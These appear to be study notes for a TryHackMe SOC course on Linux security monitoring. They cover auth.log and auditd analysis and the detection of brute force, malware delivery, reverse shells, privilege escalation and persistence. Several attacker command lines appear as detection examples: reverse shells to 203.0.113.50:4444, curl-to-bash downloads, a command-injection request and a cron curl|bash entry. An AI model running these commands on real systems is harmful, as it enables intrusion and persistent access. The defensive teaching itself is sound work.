# TryHackMe SOC Level 1 — Linux Security Monitoring

This is the Linux counterpart to the Windows module. Most servers, cloud VMs and containers run Linux, usually without a GUI, so investigations happen in the terminal with text logs and `grep`. The module covers the log sources first, then follows an attack through them: **initial access → discovery & malware → reverse shells, privesc & persistence**.

**Rooms:** Linux Logging for SOC · Linux Threat Detection 1 · Linux Threat Detection 2 · Linux Threat Detection 3

**Skills covered:** `/var/log` sources · auth.log analysis · grep/awk/sort/uniq log triage · bash history and its limits · auditd & ausearch · SSH brute force · web service exploitation · process trees · discovery commands · cryptominer attacks · reverse shells · privilege escalation · cron/systemd/SSH key/account persistence

---

## Linux Logging for SOC

Linux logs are mostly **plain text in `/var/log/`**, so you read them with `cat`, `less`, `grep` and `awk` rather than a viewer like Event Viewer.

### Key log files
| File | Contents |
|---|---|
| **`/var/log/auth.log`** (Debian/Ubuntu) · `/var/log/secure` (RHEL) | Logins, SSH, `sudo`, `su`, user and group changes |
| `/var/log/syslog` · `/var/log/messages` | General system events, cron jobs, services, time sync |
| `/var/log/kern.log` | Kernel messages |
| `/var/log/dpkg.log` · `/var/log/apt/` | Package installs and removals |
| `/var/log/nginx/` · `/var/log/apache2/` | Web access and error logs |
| `~/.bash_history` | Each user's typed commands (including `/root/.bash_history`) |
| `/var/log/audit/audit.log` | auditd runtime events |

### Reading auth.log
```
Nov  9 22:14:03 web01 sshd[2211]: Failed password for root from 203.0.113.50 port 51122 ssh2
Nov  9 22:14:09 web01 sshd[2215]: Accepted password for deploy from 203.0.113.50 port 51190 ssh2
Nov  9 22:15:41 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Nov  9 22:16:02 web01 useradd[2301]: new user: name=backup, UID=0, GID=0
```
```bash
grep -E "session opened|session closed" /var/log/auth.log
grep sshd /var/log/auth.log | grep -E "Accepted|Failed"
grep -E "(useradd|usermod|userdel|passwd)\[" /var/log/auth.log     # the \[ matches the [PID] after the process name
grep -R -E "auth|login|session" /var/log                        # search every log recursively
```

### Bash history: useful, but unreliable
`.bash_history` is only written when the shell exits, has no timestamps by default, and is trivially wiped (`history -c`, `unset HISTFILE`, `ln -sf /dev/null ~/.bash_history`). **An empty or missing history file is itself suspicious.** Don't rely on it as your only evidence.

### auditd: runtime monitoring
Programs ask the kernel to do things through **system calls**. Running a program is the **`execve`** syscall. **auditd** hooks syscalls and file access and logs them according to rules, which makes it the Linux equivalent of Sysmon.
```bash
# Example rules (/etc/audit/rules.d/)
-a always,exit -F arch=b64 -S execve -k exec            # log every command run
-w /etc/passwd -p wa -k passwd_changes                  # watch writes/attribute changes
-w /etc/crontab -p wa -k cron
```
```bash
ausearch -i                         # interpret raw records into readable text
ausearch -i -k passwd_changes       # filter by rule key
ausearch -i -x nmap                 # executions of a specific binary
ausearch -i --pid 4123              # one process
ausearch -i --ppid 4123 | grep proctitle   # its children → rebuild the tree
```
**Key fields:** `proctitle` (full command line), `exe`, `pid`/`ppid`, **`auid`** (the *original* login user, which survives `sudo`/`su`), `uid`/`euid`.

---

## Linux Threat Detection 1 — Initial Access

### SSH (T1133 / T1078 Valid Accounts)
Risks: weak or default passwords, leaked private keys, password reuse.
```bash
# Top brute-forcing IPs
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head

# Did any of them get in?
grep "Accepted" /var/log/auth.log
```
**Pattern:** hundreds of `Failed password` lines from one IP (often for `root`, `admin`, `test`, `ubuntu`) → **one `Accepted`** from the same IP = compromised. Note whether it says `Accepted password` or `Accepted publickey`: a key login from a new IP suggests a stolen key.

### Exploiting public-facing apps (T1190)
RCE, vulnerable plugins, exposed APIs and **command injection** in web apps:
```
GET /ping.php?ip=127.0.0.1;id HTTP/1.1                  200
GET /ping.php?ip=127.0.0.1%26%26wget%20http://x/s.sh   200
```
Look for shell metacharacters (`;` `&&` `|` `` ` `` `$()`) in parameters, **500 errors followed by a 200** (the attacker working out the payload), unusual user agents, and repeated POSTs to odd endpoints.

### Process trees
The strongest signal: **a service process spawning a shell**.
```
nginx / apache2 / php-fpm / java  →  sh -c  →  id / whoami / wget / curl
sshd → bash → (normal admin session)
```
Rebuild the tree with `ausearch --ppid` back to the parent, which tells you *which service* was the way in.

**Other initial access routes:** supply chain (malicious packages from npm/PyPI), insider threats, stolen cloud credentials. Detect them with baselining, file integrity monitoring and detailed auditd rules.

**Hardening:** SSH keys only (no passwords), `PermitRootLogin no`, **fail2ban**, restricted source IPs, a WAF, patching, and running web services as low-privilege users.

---

## Linux Threat Detection 2 — Discovery & Malware

### Discovery (TA0007)
The first commands after getting in. In auditd/history they show up as a quick burst:
| Goal | Commands |
|---|---|
| Who / privileges | `whoami`, `id`, `sudo -l`, `cat /etc/passwd` |
| System | `uname -a`, `hostname`, `cat /etc/os-release`, `lscpu`, `nproc`, `cat /proc/cpuinfo`, `free -m` |
| Network | `ip a`, `ifconfig`, `netstat -tulpn`, `ss -tulpn`, `cat /etc/hosts` |
| Processes & software | `ps aux`, `top`, `crontab -l`, `ls /opt` |

**One `id` is normal admin work. Ten of these in a minute from a web server process or a new SSH session isn't.** CPU and core checks (`nproc`, `lscpu`) are a classic sign of a **cryptominer**: the attacker is checking how much compute they've just got.

### Why Linux servers get attacked
Mostly **money, not espionage:** cryptomining (free CPU), botnets (DDoS for hire), proxies, and ransomware on file and database servers. Targeted data theft is rarer but more serious.

### Malware delivery
```bash
wget http://198.51.100.9/x.tar.gz -O /tmp/.x.tgz
curl -s http://198.51.100.9/s.sh | bash
chmod +x /tmp/.x && /tmp/.x
```
**Red flags:** downloads into `/tmp`, `/var/tmp` or `/dev/shm` (world-writable, often noexec-free), **hidden names** (`.x`, `...`, names that mimic kernel threads like `[kworker]`), `chmod +x` straight after a download, and piping curl into bash.

### Dota3 cryptominer case
Dota3 is a real SSH-brute-force mining campaign. The general flow the room investigates:
1. **SSH brute force** → successful login
2. **Discovery:** CPU, RAM and architecture checks
3. **Takeover:** change the compromised account's password and add the attacker's **SSH key to `authorized_keys`** so the original owner is locked out but the attacker keeps access
4. **Download & unpack** the toolkit (a tarball in a hidden directory)
5. **Miner setup:** run an XMRig-style miner, kill competing miners, persist via cron

**Detection angle:** every step leaves traces in auth.log (logins, password change), auditd (`execve` of `wget`, `tar`, `chmod`, the miner), and outside the logs as **CPU stuck at 100%** and outbound connections to mining pools (ports like 3333/4444/5555, `stratum+tcp://`).

---

## Linux Threat Detection 3 — Reverse Shells, Privesc, Persistence

### Reverse shells
The victim connects *out* to the attacker (outbound usually gets past the firewall), and the attacker gets an interactive shell.
```bash
bash -i >& /dev/tcp/203.0.113.50/4444 0>&1
nc -e /bin/sh 203.0.113.50 4444
python3 -c 'import socket,subprocess,os;...'
```
**Detect:** `bash`/`sh` with a network socket as stdin/stdout, `nc`/`ncat`/`socat` executions, `/dev/tcp/` in a command line, outbound connections from a web server user (`www-data`) to odd ports. Follow-up commands like `python3 -c 'import pty; pty.spawn("/bin/bash")'` (upgrading the shell) are another tell.

### Privilege escalation (TA0004)
From `www-data` or a normal user to **root**:
| Technique | Look for |
|---|---|
| Misconfigured **sudo** | `sudo -l` then `sudo vim/find/less` escapes (GTFOBins) |
| **SUID** binaries | `find / -perm -4000 2>/dev/null` |
| Kernel exploits | Exploit files compiled in `/tmp`, `gcc` on a production server |
| Credentials in files | `grep -r password /var/www`, reading `.env`, config files, history |
| Writable cron scripts / `PATH` hijack | Root-owned jobs calling user-writable scripts |

The auditd **`auid` vs. `euid`** gap shows it: a command running as euid 0 (root) whose auid is the compromised user.

### Startup persistence
| Method | Where | Detect |
|---|---|---|
| **Cron** (T1053.003) | `crontab -e`, `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/` | syslog `CRON` lines, auditd watch on cron files. `* * * * * curl ... \| bash` |
| **systemd service** (T1543.002) | New unit in `/etc/systemd/system/` + `systemctl enable` | New `.service` files, `ExecStart` pointing to `/tmp` or a hidden path |
| Shell startup files | `~/.bashrc`, `~/.profile`, `/etc/profile.d/` | Network commands added to them |

### Account persistence
| Method | Detect |
|---|---|
| **SSH key** in `~/.ssh/authorized_keys` (T1098.004) | auditd watch on `authorized_keys`, `Accepted publickey` from new IPs |
| **New user** (T1136) | `useradd[` in auth.log, new lines in `/etc/passwd` |
| **UID 0 backdoor** | Any account other than root with UID 0: `awk -F: '$3==0' /etc/passwd` |
| Added to `sudo` / `wheel` group | `usermod -aG sudo` in auth.log |
| Password changed on an existing account | `passwd[` entries |

### Full chain recap
```
Initial Access   Failed password ×N → Accepted (auth.log)  |  nginx → sh (auditd)
Discovery        id, uname -a, nproc, ss -tulpn
Delivery         wget → /tmp/.x, chmod +x
Reverse shell    bash -i >& /dev/tcp/...
Privesc          sudo -l → GTFOBins / SUID → euid 0
Persistence      cron, systemd unit, authorized_keys, useradd UID 0
Impact           miner at 100% CPU / botnet / ransomware
```
**Takeaway:** it's the same ATT&CK chain as Windows, with different evidence: **auth.log ≈ Security log**, **auditd ≈ Sysmon**, **cron/systemd ≈ scheduled tasks/services**, **authorized_keys ≈ backdoor account**.
